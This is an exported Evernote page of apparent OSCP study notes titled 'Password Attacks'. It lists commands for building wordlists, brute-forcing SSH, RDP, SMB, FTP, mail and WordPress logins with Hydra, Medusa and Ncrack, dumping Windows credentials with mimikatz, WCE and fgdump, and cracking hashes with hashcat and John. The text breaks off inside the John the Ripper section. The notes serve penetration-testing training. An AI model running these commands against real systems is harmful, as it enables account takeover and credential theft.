<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Security"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-05 18:47:52 +0000"/><meta name="source" content="desktop.win"/><meta name="source-application" content="evernote.win32"/><meta name="updated" content="2018-01-06 15:22:18 +0000"/><title>Password Attacks</title></head><body><div><ul><li><span style="font-size: 12pt;">AES Decryption</span><span style="font-size: 12pt; font-weight: bold;">&nbsp;&nbsp;</span><a href="http://aesencryption.net/">http://aesencryption.net/</a></li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Convert multiple webpages into a word list</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>for x in 'index' 'about' 'post' 'contact' ; do \</div><div>&nbsp;&nbsp; curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \</div><div>done</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Or convert html to word list dict</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>html2dic index.html.out | sort -u &gt; index-html.dict</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Default Usernames and Passwords</span></li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">CIRT&nbsp;&nbsp;</span>(<a href="http://www.cirt.net/passwords">http://www.cirt.net/passwords</a>)</li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Government Security - Default Logins and Passwords for&nbsp;&nbsp;</span>Networked Devices (<a href="http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php">http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php</a>)</li></ul></div><div><br/></div><div><ul><li><a href="http://virus.org/" style="font-size: 10pt; color: rgb(0, 0, 0);">Virus.org</a><span style="font-size: 10pt;">&nbsp;&nbsp;(</span><a href="http://www.virus.org/default-password/" style="font-size: 10pt; color: rgb(0, 0, 0);">http://www.virus.org/default-password/</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Default Password (</span><a href="http://www.defaultpassword.com/" style="font-size: 10pt; color: rgb(0, 0, 0);">http://www.defaultpassword.com/</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Brute Force</span></li></ul></div><div><ul><li><span style="font-size: 10pt;">Nmap Brute forcing Scripts&nbsp;&nbsp;</span><span style="font-size: 10pt;">(</span><a href="https://nmap.org/nsedoc/categories/brute.html" style="font-size: 10pt; color: rgb(0, 0, 0);">https://nmap.org/nsedoc/categories/brute.html</a><span style="font-size: 10pt;">)</span></li></ul></div><div><ul><li><span style="font-size: 10pt;">Nmap Generic auto detect brute force attack:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>nmap --script brute -Pn &lt;<a href="http://target.com/">target.com</a> or ip&gt;</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">MySQL nmap brute force attack:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>nmap --script=mysql-brute $ip</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Dictionary Files</span></li></ul></div><div><ul><li><span style="font-size: 10pt;">Word lists on Kali</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>cd /usr/share/wordlists</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Key-space Brute Force</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>crunch 6 6 0123456789ABCDEF -o crunch1.txt</div><div><br/></div><div>crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha</div><div><br/></div><div>crunch 8 8 -t ,@@^^%%%</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">&nbsp;&nbsp;</span><span style="font-size: 10pt; font-weight: bold;">Pwdump and Fgdump</span> <span style="font-size: 10pt;">- Security Accounts Manager (SAM)</span></li></ul></div><div><ul><li><span style="font-size: 10pt;">`pwdump.exe` - attempts to extract password hashes</span></li></ul></div><div><ul><li><span style="font-size: 10pt;">`fgdump.exe` - attempts to kill local antiviruses before&nbsp;&nbsp;</span>attempting to dump the password hashes and cached credentials.</li></ul><div><br/></div><ul><li><span style="font-weight: bold;">Windows Credential Editor (WCE)</span></li></ul><div><span style="font-size: 10pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;allows one to perform several attacks to obtain clear text passwords and hashes. Usage: </span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;">`wce -w`</div><div><br/></div><ul><li><span style="font-weight: bold;">Mimikatz</span></li></ul></div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets ( <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>)</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;From metasploit meterpreter (must have System level access):</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>meterpreter&gt; load mimikatz</div><div>meterpreter&gt; help mimikatz</div><div>meterpreter&gt; msv</div><div>meterpreter&gt; kerberos</div><div>meterpreter&gt; mimikatz_command -f samdump::hashes</div><div>meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Password Profiling</span></font></li></ul></div><div><br/></div><div>cewl can generate a password list from a web page</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>cewl <a href="http://www.megacorpone.com/">www.megacorpone.com</a> -m 6 -w megacorp-cewl.txt`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt; font-weight: bold;">Password Mutating</span></li></ul></div><div><br/></div><div>John the ripper can mutate password lists</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>nano /etc/john/john.conf</div><div>john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt; font-weight: bold;">Medusa</span></li></ul></div><div><br/></div><div>Medusa, initiated against an htaccess protected web directory</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Ncrack</span></font></li></ul></div><div><br/></div><div>ncrack (from the makers of nmap) can brute force RDP</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ncrack -vv --user offsec -P password-file.txt rdp://$ip`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt; font-weight: bold;">Hydra</span></li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">&nbsp;&nbsp;Hydra brute force against SNMP</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -P password-file.txt -v $ip snmp`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra FTP known user and rockyou password list</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra SSH using list of users and passwords</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra SSH using a known password and a username list</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra SSH Against Known username on port 22</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra POP3 Brute Force</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra SMTP Brute Force</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra attack http get 401 login with a dictionary</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra attack Windows Remote Desktop with rockyou</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra brute force SMB user with rockyou:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hydra brute force a Wordpress admin login</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`</div></div><div><br/></div><div><hr/></div><div><br/></div><div><span style="font-size: 14pt; font-weight: bold;">Password Hash Attacks</span></div><div><div><br/></div><ul><li><span style="font-size: 10pt;">Online Password Cracking</span></li><ul><li>(<a href="https://crackstation.net/">https://crackstation.net/</a>)</li><li><span style="font-size: 10pt;">(</span><a href="http://finder.insidepro.com/" style="font-size: 10pt; color: rgb(0, 0, 0);">http://finder.insidepro.com/</a><span style="font-size: 10pt;">)</span></li></ul></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hashcat</span></li></ul></div><div>&nbsp;&nbsp;&nbsp;&nbsp;Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev</div></div><div>&nbsp;&nbsp;and</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>apt-get install pocl-opencl-icd</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Cracking Linux Hashes - /etc/shadow file</span></font></li></ul></div><div><div><br/></div><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>500&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>md5crypt $1$</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;MD5(Unix)</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Operating-Systems</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>3200&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;bcrypt $2*$</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Blowfish(Unix)</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Operating-Systems</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>7400&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>sha256crypt $5$</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>SHA256(Unix)</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Operating-Systems</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>1800&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>sha512crypt $6$</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;SHA512(Unix)&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Operating-Systems</div></td></tr></tbody></table><div><br/></div></div><div><ul><li><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Cracking Windows Hashes</span></font></li></ul></div><div><div><br/></div><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>3000&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>LM</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Operating-Systems</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>1000&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>NTLM</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Operating-Systems</div></td></tr></tbody></table><div><br/></div></div><div><ul><li><span style="font-size: 10pt; font-weight: bold;">Cracking Common Application Hashes</span></li></ul></div><div><div><br/></div><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>900&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>MD4&nbsp;&nbsp;&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Raw Hash</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>0</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>MD5&nbsp;&nbsp;&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Raw Hash</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>5100</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Half MD5</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>Raw Hash</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>100&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>SHA1&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Raw Hash</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>10800&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>SHA-384</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Raw Hash</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>1400&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>SHA-256</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Raw Hash</div></td></tr><tr><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>1700</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>SHA-512&nbsp;&nbsp;&nbsp;&nbsp;</div></td><td style="border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div>&nbsp;&nbsp;Raw Hash</div></td></tr></tbody></table><div><br/></div></div><div>&nbsp;&nbsp;Create a .hash file with all the hashes you want to crack puthasheshere.hash:</div><div>`$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`</div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:</span></li><ul><li><span style="font-size: 10pt;">On Linux</span></li></ul></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</div></div><div><ul><li><span style="font-size: 10pt;">For windows</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-family: Monaco; font-size: 9pt;">E:\pentest\tools\hashcat-4.0.1\hashcat64.exe -O -a 0 -m 500 --remove -o E:\pentest\hashes\kioptrix2.fixed.txt E:\pentest\hashes\kioptrix2.hash E:\pentest\payloads\danielmiessler\Passwords\rockyou.txt</span></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>E:\pentest\tools\hashcat-4.0.1\hashcat64.exe -r E:\pentest\tools\hashcat-4.0.1\rules\OneRuleToRuleThemAll.rule -a 0 -m 500 --remove -o E:\pentest\hashes\md5.fixed.txt E:\pentest\hashes\md5.txt E:\pentest\payloads\danielmiessler\Passwords\rockyou.txt</div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>E:\pentest\tools\hashcat-4.0.1\hashcat64.exe -r E:\pentest\tools\hashcat-4.0.1\rules\best64.rule -a 0 -m 500 --remove -o E:\pentest\hashes\md5.fixed.txt E:\pentest\hashes\md5.txt E:\pentest\payloads\danielmiessler\Passwords\rockyou.txt</div></div><div><br/></div><div>&nbsp;&nbsp;Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`</div><div>&nbsp;&nbsp;&nbsp;&nbsp;Wordpress clear text: `test`</div><div><br/></div><div><ul><li><span style="font-size: 10pt;">&nbsp;&nbsp; Hashcat example cracking Wordpress passwords using rockyou:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Sample Hashes (</span><a href="http://openwall.info/wiki/john/sample-hashes" style="font-size: 10pt; color: rgb(0, 0, 0);">http://openwall.info/wiki/john/sample-hashes</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">Identify Hashes</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>hash-identifier</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">To crack linux hashes you must first unshadow them:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>unshadow passwd-file.txt shadow-file.txt</div><div>unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</div></div><div><br/></div><div><ul><li><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">John the Ripper - Password Hash Cracking</span></font></li></ul></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 